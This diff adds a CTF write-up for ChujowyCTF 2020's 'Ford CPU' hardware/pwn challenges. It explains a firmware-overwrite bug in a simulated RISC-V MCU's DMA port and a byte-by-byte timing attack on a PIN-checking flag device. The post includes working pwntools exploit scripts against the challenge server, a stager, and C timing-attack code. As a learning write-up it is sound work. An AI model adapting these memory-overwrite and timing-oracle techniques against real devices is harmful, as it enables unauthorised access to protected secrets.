@@ -1,0 +1,462 @@
+#+title: ChujowyCTF 2020 - Ford CPU I & II (hardware/pwn)
+#+author: Daniel Brodsky
+#+date: 2020-07-17
+#+hugo_base_dir: ../../
+#+hugo_section: writeups
+#+startup: inlineimages
+#+hugo_menu: :menu "foo" :weight 10 :parent main :identifier single-toml
+#+description: Everything in one problem
+
+** Problem
+~I really hate the slow transfer rates of UART, so I've designed a custom MCU based on the new cool RISC-V ISA which features a parallel port with DMA.~
+
+~This CPU will revolutionize the automotive industry - can't wait to install it in my red ford.~
+
+~In case someone gains arbitrary code execution on the risc-v core the Ford CPU provides advanced security mechanisms to protect secrets. The flag device reveals secrets only to people who know a secret pin. Can you steal the flag from the flagdevice?~
+
+~nc ford-cpu.chujowyc.tf 4001~
+
+~Source:~ [[/fordcpu.tar.gz][fordcpu.tar.gz]]
+** Analysis
+We're given a binary that has inside a fully-simulated RISC-V machine running a custom firmware kernel, along with all the source files to make this possible. A full machine here means that there are hardware-level specifications for a RISC-V CPU and all of its connected peripherals. These parts are described using [[https://en.wikipedia.org/wiki/Verilog][Verilog]], a hardware descriptive language (HDL). The normal circuitry descriptions that are derived from HDL are no use on our immutable host hardware, so a hardware simulator known as [[https://github.com/verilator/verilator][Verilator]] is used to compile Verilog to somewhat inefficient C/C++. I say inefficient because a described circuit can have a much higher level of parallelization by being designed with more wires handling 1 signal, while as a regular CPU is limited by the number of cores it was designed with. While it won't matter for this problem, it's still good to know the benefits of custom-designed hardware vs using a CPU.
+
+Verilator handles 2 important parts in the execution of the system: the continuous flipping of clock signal from high to low and the passing of I/O between the host system and the simulated system. Both these parts are descibed by ~mcu_loop()~ and ~io_loop()~ in main.cpp.
+
+Moving on, the hardware described is as follows:
+- a 32-bit RISC-V CPU identical to the [[https://github.com/cliffordwolf/picorv32][picoRV32]]
+- a [[https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter][UART]] controller
+- an [[https://en.wikipedia.org/wiki/Advanced_eXtensible_Interface][AXI]] controller
+- a custom [[https://en.wikipedia.org/wiki/Parallel_port][LPT]] port for interfacing with the AXI controller
+- a custom [[https://en.wikipedia.org/wiki/Semiconductor_intellectual_property_core][IP]] named the "flag device" (for part 2 only)
+- a custom memory controller layer to redirect port access from memory access
+
+An initial firmware is loaded into memory so that the user can interface with the machine. Certain memory addresses are overridden to instead trigger signals in these devices, and any actions done by these devices is concurrent to our main program. The firmware sets some initial state for hardware devices, such as enabling the LPT port and making character inputs write to the ~cmd~ buffer within the firmware for processing. It also reads state changes within the LPT using a hardware interrupt routine to determine when to process new data or throw an error. The code pertaining to these functionalities is located in ~firmware/main.c~:
+
+#+BEGIN_SRC C
+
+static void process_command(char* arg) {
+    if(!safe_cmd_compare(arg, "inf\n")) {
+        response = "This leet mcu is powered by the new RISCV architecture :D\n";
+        goto exit;
+    }
+    if(!safe_cmd_compare(arg, "eula")) {
+        response = "[END USER LICENCE AGREEMENT] INSERT SOME LONG TEXT HERE\nIf you accept the EULA then send ack\n";
+        goto exit;
+    }
+    if(!safe_cmd_compare(arg, "ack\n")) {
+        response = "OK\n";
+        eula_accepted = 1;
+        goto exit;
+    }
+    if(!safe_cmd_compare(arg, "cmp\n")) {
+        if(!eula_accepted) {
+            response = "You must accept the EULA\n";
+            goto exit;
+        } else {
+            response = "Now you have 3 tries to guess the flag\n";
+            flag_mode = 1;
+            goto exit;
+        }
+    }
+    response = "Invalid command\n";
+exit:
+  return;
+}
+
+...
+
+const char FLAG[] = "FAKE_FLAG";
+const int FLAG_SIZE = sizeof(FLAG);
+volatile int tries = 0;
+static void check_flag(char *arg) {
+    char c = 0;
+    for(int i = 0; i<FLAG_SIZE; i++) {
+        c |= (FLAG[i] ^ arg[i]);
+    }
+
+    if (!c) {
+        response = FLAG;
+        tries = 0;
+        return;
+    }
+
+    if(tries == 2) {
+        // Send trap so the simulator reboots the CPU
+        tries = 0;
+        flag_mode = 0;
+        eula_accepted = 0;
+        __asm__ __volatile__ ("ebreak");
+    }
+
+    response = "INVALID FLAG\n";
+    tries += 1;
+}
+
+...
+
+static void irq_lpt_rx_done(void) {
+    if(!flag_mode)
+        process_command(cmd);
+    else
+        check_flag(cmd);
+
+    // Send ack that the data was processed
+    REG32(LPT_REG_RX_BUFFER_RX) = 1;
+}
+
+#+END_SRC
+
+We can input a command by triggering the hardware interrupt indicating the LPT is done receiving (RX_DONE). Note that RX means for the hardware to receive from input and TX means for the hardware to transmit to output. The rx_done wire is only set to high in 1 location in the HDL:
+
+#+BEGIN_SRC Verilog
+...
+if (lpt_in_data == 32'h0a0a0a0a) begin
+    terminator <= 1;
+    rx_done <= 1;
+...
+#+END_SRC
+If we write 4 newline characters to the LPT (which the firmware sets to be written to already) then our command will be processed. From here we now know what we can interface with and what we can change with it.
+
+** Part I Vulnerability
+
+From the firmware code above we see that once we enter the flag checking state we get 3 attempts to guess the flag before the system resets itself due to a trap instruction. The reset is actually handled by the simulator in the following block of code:
+
+#+BEGIN_SRC C++
+void mcu_loop() {
+    ...
+        if (top->trap) {
+            // Reset on CPU failure.
+            fprintf(stdout, "resetting...\n");
+            top->resetn = 0;
+            c(10);
+            top->resetn = 1;
+        }
+    ...
+#+END_SRC
+
+The simulator will set wire ~resetn~ to low and then complete 10 clock cycles to give the system enough to time to complete any routine that relies on this signal. There are many areas in the HDL that handle a ~resetn~ signal, as each device must reset their state back to their starting state when a reset is received. The LPT is no exception and should reset its RX and TX state registers back to their original value:
+
+#+BEGIN_SRC Verilog
+...
+    if (!resetn) begin
+        ctrl_rx_buffer_start_ptr <= 32'b0;
+        ctrl_rx_buffer_end_ptr <= 32'b0;
+        ctrl_rx_buffer_rx_ptr <= 32'b0;
+
+        ctrl_tx_buffer_start_ptr <= 32'b0;
+        ctrl_tx_buffer_end_ptr <= 32'b0;
+...
+#+END_SRC
+
+What does setting the RX buffer start and end pointer to 0 here mean? The buffer start pointer indicates where data received should be written to in memory, so setting it to 0 means we'll be writing to the beginning of memory. The end pointer is meant to indicate when we're out of buffer space, but if we look at the code for this:
+#+BEGIN_SRC Verilog
+...
+    // note: rx_buffer_rx_ptr is set to rx_buffer_start_ptr prior to this
+    ctrl_rx_buffer_rx_ptr <= ctrl_rx_buffer_rx_ptr + 4;
+    rx_done <= (ctrl_rx_buffer_rx_ptr + 4) == ctrl_rx_buffer_end_ptr;
+    rx_done_irq <= (ctrl_rx_buffer_rx_ptr + 4) == ctrl_rx_buffer_end_ptr;
+    rx_done_irq <= (ctrl_rx_buffer_rx_ptr + 4) == ctrl_rx_buffer_end_ptr;
+...
+
+assign irq_rx_done = ctrl_state_enable_rx & terminator;
+assign irq_rx_full = ctrl_state_enable_rx & rx_done_irq & !terminator;
+...
+#+END_SRC
+we see that an interrupt for a full read won't occur unless ~start + 4 == end~. Since both are at 0 when the program starts, any input will be written to memory until RAM is filled and memory loops back to 0. While there isn't any problem with this reset code, the real fault lies in that the rx buffer is never disabled when a reset occurs. Furthermore, the firmware does set the rx buffer to the location of ~cmd~ but it stalls in some of its initialization code long enough that we can overwrite all of memory.
+
+#+BEGIN_SRC C
+void main() {
+...
+    printf("TERMINATING SLOW UART - TIME FOR 1337 DMA xD\n");
+
+    // Wait some time for the UART to be send to the user
+    for(int i = 0; i<20000; i++);
+
+    // Enable TX for parallel port (this disables RX)
+    REG32(LPT_REG_STATE) = 2;
+...
+#+END_SRC
+
+** Part I Exploit
+
+Now that we know exactly where the vulnerability is and what we can do with it, we need to create an exploit that will leak the flag sitting in memory. Within our RISC-V core, the firmware code is executed from address 0x0 so writing any shellcode to the start of memory would already give us code execution. We would also need to trigger another reset after writing this code into memory, since the firmware would've already executed initialization by the time we can overwrite anything. However, due to how the original firmware is written, we only have 0x12 bytes at the start to work with before we would end up overwriting an IRQ handler, causing our firmware to crash before we can get the system to reset again or write in our entire payload.
+
+#+BEGIN_SRC shell
+
+riscv32-elf-objdump -m riscv -Mintel -D ./ram.elf | less
+
+./ram.elf:     file format elf32-littleriscv
+
+Disassembly of section .text:
+
+00000000 <_ftext>:
+       0:	aaa9                	j	15a <_start>
+	...
+       e:	0000                	unimp
+      10:	a009                	j	12 <_irq>
+
+00000012 <_irq>:
+      12:	0200a10b          	0x200a10b
+      16:	0201218b          	0x201218b
+      1a:	60ad                	lui	ra,0xb
+
+#+END_SRC
+NOTE: ram.elf was obtained by building the given source project for the firmware
+
+To circumvent this, we can overwrite a different executed region in memory that's large enough for our payload. Annoyingly enough, while this works locally, it fails on the target server for reasons unknown at this time (more on this in a bit).
+
+One option to get past this problem is to take advantage of the 0x12 bytes we have available and write in a small payload that will dump all program memory. ~REG32(LPT_REG_TX_BUFFER_END) = 0x10000; while(1);~ does just that, telling the LPT to print all data in memory and then stalling long enough for the data to be printed without the machine resetting.
+
+The other option is to try punching the problem (and server) to death by repeatedly overwriting the remote firmware with varying amounts of the firmware we have locally and seeing if the system crashes. In the process of doing this, writing ~0x248~ or more bytes of local firmware to the server causes it to dump all of its memory starting from the strings section. Hmmmm.....
+
+The explanation for this weird behaviour can be found in the remote firmware that we dumped from the server. From there we can see that, for whatever reason, after a certain number of bytes all data in memory is shifted 2 bytes higher on remote than local. So why does writing our local firmware over the remote dump memory? Let's take a look at address ~0x248~ in the firmware to find out:
+
+#+BEGIN_SRC shell
+
+riscv32-elf-objdump -b binary -m riscv -Mintel -D ./local.bin | less
+...
+    242:	6d2000ef          	jal	ra,0x914 # strlen
+    246:	87aa                	mv	a5,a0
+    248:	fef42423          	sw	a5,-24(s0)
+    24c:	fe842783          	lw	a5,-24(s0)
+...
+
+riscv32-elf-objdump -b binary -m riscv -Mintel -D ./remote.bin | less
+...
+     242:	6d4000ef          	jal	ra,0x916 # strlen
+     246:	87aa                	mv	a5,a0
+     248:	fef42423          	sw	a5,-24(s0)
+     24c:	fe842783          	lw	a5,-24(s0)
+...
+#+END_SRC
+
+Notice the difference? In the local firmware ~strlen~ is reached using ~jal ra,0x914~ while the remote firmware reads an address that is 2 bytes higher than that. Since we aren't overwriting as far as ~strlen~, this means we'll end up executing the instruction before ~strlen~ instead, which is a ~ret~. In the firmware ~strlen~ is called by ~fast_puts~ to determine how much memory it needs to set the TX buffer size to, but since ~strlen~ is now ~ret~ we end up getting back the address of the target string as its size. So our firmware ends up dumping out a bunch of memory. What a fortunate coincidence!
+
+Oh, and we got flag...
+
+#+BEGIN_SRC text
+If you accept the EULA then send ack
+\x00\x00ck
+\x00\x00OK
+\x00mp
+\x00\x00You must accept the EULA
+\x00\x00ow you have 3 tries to guess the flag
+\x00nvalid command
+\x00\x00chCTF{Pr0P3R_r353771n9_15_V3rY_H4RD}\x00\x00INVALID FLAG
+\x00\x00RR: IRQ %d undhandled!
+\x00\x00.\x11\x00
+#+END_SRC
+
+The exploit code used:
+
+#+BEGIN_SRC python
+from pwn import *
+
+data = open("firmware.hex", "rb").read()
+data = data.replace(b'\n',b'')
+firmware = b''
+for i in range(0,len(data), 8):
+    firmware += struct.pack("<I", int(data[i:i+8],16))
+write("local.bin", data=firmware)
+
+# r = process('./Vtop')
+r = remote("ford-cpu.chujowyc.tf", 4001)
+r.interactive()
+
+r.send(b"ack\n\n\n\n\n")
+print(r.recv())
+r.send("cmp\n\n\n\n\n")
+print(r.clean())
+r.send("AAAA\n\n\n\n")
+print(r.clean())
+r.send("AAAA\n\n\n\n")
+print(r.clean())
+r.send("AAAA\n\n\n\n")
+firmware = firmware[:0x248]
+r.send(firmware)
+
+r.interactive()
+#+END_SRC
+
+** Part II Analysis
+
+~In case someone gains arbitrary code execution on the risc-v core the Ford CPU provides advanced security mechanisms to protect secrets. The flag device reveals secrets only to people who know a secret pin. Can you steal the flag from the flagdevice?~
+
+Clearly the vulnerability we're looking for lies somewhere inside of the flagdevice. There is only 1 file ~axi4_flagdevicetm.v~ that contains all of the flagdevice's functionality. A quick summary of this device (because this writeup is getting too long) is that it holds a 16-byte flag in memory that can only be read through DMA by the CPU if we write the same 16 bytes the device holds in its ~correct_pin~ memory to ~pin~ memory.
+#+BEGIN_SRC C
+/*
+MEMORY LAYOUT:
+0x00 - 0x0f --- PIN1 | PIN2 | PIN3 | PIN4 | ... | PIN15
+0x10 - 0x13 --- CHECK_START // WRITING TO THIS REG WILL START PIN CHECKING
+0x14 - 0x17 --- DEVICE_STATUS // 0 - idle, 1 - in progress
+0x18 - 0x1b --- PIN_STATUS // 0 - wrong, 1 - correct
+0x20 - ...  --- FLAG1 | FLAG2 | FLAG3 | ...
+*/
+#+END_SRC
+We can write as much as we want to ~pin~ memory, but memory will only be checked when we write to ~CHECK_START~. The device will then check the pins input against the correct pins here:
+#+BEGIN_SRC Verilog
+    // PIN checking
+    always @(posedge clk) begin
+        if (device_status) begin
+            delay <= delay + 1;
+            if (delay == 8'hff) begin
+                if (pin_bytes[ctr] == correct_pin[ctr]) begin
+                    ctr <= ctr + 1;
+                    if(ctr == 4'hf) begin
+                        device_status <= 0;
+                        pin_status <= 1;
+                    end
+                end else begin
+                    device_status <= 0;
+                    pin_status <= 0;
+                end
+            end
+        end
+    end
+#+END_SRC
+During pin checking ~DEVICE_STATUS~ will be set to 1 and once pin checking is complete it will be set back to 0. Each pin byte will be checked one at a time. If the bytes are all correct then it will set ~PIN_STATUS~ to 1, returning the flag bytes when ~FLAG~ memory is read from.
+
+** Part II Vulnerability
+
+An obvious oddity about the flagdevice is that there is a delay in pin checking of 255 clock cycles each time a new pin checking is requested. While this doesn't lead to anything in particular, it does bring attention to the fact that pin checking is time-sensitive. Since the device only checks 1 byte at a time and not the entire 16 byte pin in 1 cycle, there is a direct correlation between the amount of our pin that is correct and the number of cycles pin checking runs for. We can use ~DEVICE_STATUS~ as an oracle to find out when pin checking completes. Since this check is running on hardware, it's concurrent to the firmware's execution and we can measure the amount of time each run of pin checking takes.
+
+
+** Part II Exploit
+
+The above vulnerability outlines all the tools we need to build a [[https://en.wikipedia.org/wiki/Timing_attack][timing attack]] against the server. If the first byte in our pin is correct then the duration of time spent pin checking will increase. This repeats for every consecutive correct pin we write. To exploit this, we'll iterate over all possible bytes and each time the duration of pin checking increases we'll save the pin bytes used so far and start guessing the next byte. Once we get all 16 bytes we read the now available flag bytes from memory. The code for doing this can be found below:
+
+#+BEGIN_SRC C
+// get an initial delay value
+int longest_delay = 0;
+
+// I'm fucked if the first byte is 169
+REG32(FLAG_DEV_PIN_0) = 169;
+REG32(FLAG_DEV_CHECK_START) = 1;
+// track cycles needed to check pins
+while (REG32(FLAG_DEV_DEVICE_STATUS) != 0)
+    ++longest_delay;
+
+// set all pins to 0
+for (int i = 0; i < 4; ++i) {
+    int* addr = (int*) FLAG_DEV_PIN + 4*i;
+    *addr = 0;
+}
+
+int curr = 0;
+// loop for each char in pin (16)
+for (int i = 0; i < 4; ++i) {
+
+    curr = 0;
+    int* addr = (int*) FLAG_DEV_PIN + i;
+
+    for (int j = 0; j < 4; ++j) {
+        // guess the value of pin_bytes[i] (0-255)
+        for (int v = 0; v <= 256; ++v) {
+            if (v == 256) {
+                break;
+            }
+
+            int tmp = curr;
+            tmp <<= (4-j)*8;
+            tmp >>= (4-j)*8;
+            tmp += v << j*8;
+            *(addr) = tmp;
+
+            int t = 0;
+            // start checking
+            REG32(FLAG_DEV_CHECK_START) = 1;
+            // track cycles needed to check pins
+            while (REG32(FLAG_DEV_DEVICE_STATUS) != 0)
+                ++t;
+            if (t >= longest_delay+5) { // pin delay, byte is correct
+                curr = tmp;
+                REG32(LPT_REG_STATE) = 2;
+                REG32(LPT_REG_TX_BUFFER_START) = (int) &tmp;
+                REG32(LPT_REG_TX_BUFFER_END) = (int) &tmp+4;
+                longest_delay = t;
+                break;
+            }
+        }
+    }
+}
+// last byte cannot be checked w/ side-channel (same # of byte checks)
+for (int v = 0; v < 256; ++v) {
+    int tmp = curr;
+    tmp <<= 8;
+    tmp >>= 8;
+    tmp += v << 24;
+    *((int*) FLAG_DEV_PIN + 3) = tmp;
+    REG32(FLAG_DEV_CHECK_START) = 1;
+    while (REG32(FLAG_DEV_DEVICE_STATUS) != 0);
+    if (REG32(FLAG_DEV_PIN_STATUS) == 1) {
+        REG32(LPT_REG_STATE) = 2;
+        REG32(LPT_REG_TX_BUFFER_START) = FLAG_DEV_FLAG_START;
+        REG32(LPT_REG_TX_BUFFER_END) = FLAG_DEV_FLAG_START + 0x10;
+        break;
+    }
+
+}
+
+#+END_SRC
+
+The (unnecessarily) painful part of this problem was getting the exploit code into the firmware and executing it. After compiling this code to RISC-V using the provided build files, some jump instructions were compiled to be absolute addresses within the exploit. We'd need to place our exploit at the same address in the firmware as what it was compiled to. Also, the stalling loop at the beginning of execution doesn't give us enough time to write an exploit of this size into memory while also writing in the original firmware to offset our exploit to the correct address. It's a pity we're in a custom system, because it'd be really nice to have a read syscall right about now...
+
+I guess we could always just make our own. We can set the RX buffer ourselves to write what we input to the designated memory address, and a loop to keep the program from executing long enough to drop in our exploit. This code was written into the ~_start~ location in memory without overwriting the jump to ~main~:
+#+BEGIN_SRC C
+    // Stager code
+    REG32(LPT_REG_RX_BUFFER_START) = (int) 0x2e2;
+    REG32(LPT_REG_RX_BUFFER_END) = (int) 0x2e2 + 800;
+    REG32(LPT_REG_STATE) = 2 | 1;
+    int a = 0;
+    while (1) {
+        if (a > 100000)
+            break;
+        ++a;
+    }
+#+END_SRC
+The loop in this code looks a bit weird to avoid some random issues behind the scenes that wasted several hours of my time. Anyways, using this we get the ability to write anything we want into ~main~ so we can now run our exploit.
+
+#+BEGIN_SRC python
+from pwn import *
+
+server = open("remote.bin", "rb").read() # weirdo remote firmware dump
+
+stager = open("stager.elf", "rb").read() # stager code at main()
+payload = open("payload.elf", "rb").read() # exploit code at main()
+
+# r = process('./Vtop')
+r = remote('ford-cpu.chujowyc.tf', 4001)
+r.interactive()
+
+r.send(b"ack\n\n\n\n\n")
+print(r.clean())
+r.send("cmp\n\n\n\n\n")
+print(r.clean())
+r.send("AAAA\n\n\n\n")
+print(r.clean())
+r.send("AAAA\n\n\n\n")
+print(r.clean())
+r.send("AAAA\n\n\n\n")
+
+firmware = server[:0x15a] + stager[0x12e4:0x1330]
+r.send(firmware)
+
+r.interactive() # manually cause reset here, then kill this shell
+
+r.send(payload[0x12e4:0x1558])
+r.interactive()
+#+END_SRC
+
+Running this gets the server to run our timing attack, compute the correct pin, and spit out the flag.
+
+~&\x00\x00\x1a\x00\x1a\x00&\x1a0&\x1a0p\x00\x00p\xa2\x00p\xa2\p\xa2\xd2\xe\\xfc\x\xf\xc4\Č\x00Č\x86\x00Č\x86\xfe71m1N9_4774ck_xDresetting...~
+
+~71m1N9_4774ck_xD~
+
+** Opinion
+This was my 3rd time encountering Verilog RTL in a CTF and my 2nd time seeing a full system enclosed in a single problem. I'm a bit obsessed with [[https://en.wikipedia.org/wiki/Field-programmable_gate_array][FPGAs]] at the moment, so I really wanted to solve this problem when I first saw it. I'd definitely say it was a good problem and I learned a significant amount about RISC-V assembly and hardware simulation on the way, but some inconsistencies between the remote and local wasted quite a bit of my time along the way. It was still a great question though, especially because it forces you to traverse through several software-related abstractions you rarely see.
+
+** References
+- a [[https://docs.google.com/viewer?url=https%3A%2F%2Fwww.cl.cam.ac.uk%2Fteaching%2F1617%2FECAD%2BArch%2Ffiles%2Fdocs%2FRISCVGreenCardv8-20151013.pdf&pdf=true][RISC-V cheat sheet]] for understanding how RISC-V instructions work
+- another [[ https://docs.google.com/viewer?url=https%3A%2F%2Fraw.githubusercontent.com%2Fjameslzhu%2Friscv-card%2Fcc7636f39ca3e7298b209a91fd9978eef83df44b%2Friscv-card.pdf&pdf=true][RISC-V cheat sheet]] because one wasn't enough
+- a [[https://docs.google.com/viewer?url=https%3A%2F%2Fweb.stanford.edu%2Fclass%2Fee183%2Fhandouts_win2003%2FVerilogQuickRef.pdf&pdf=true][Verilog reference sheet]]
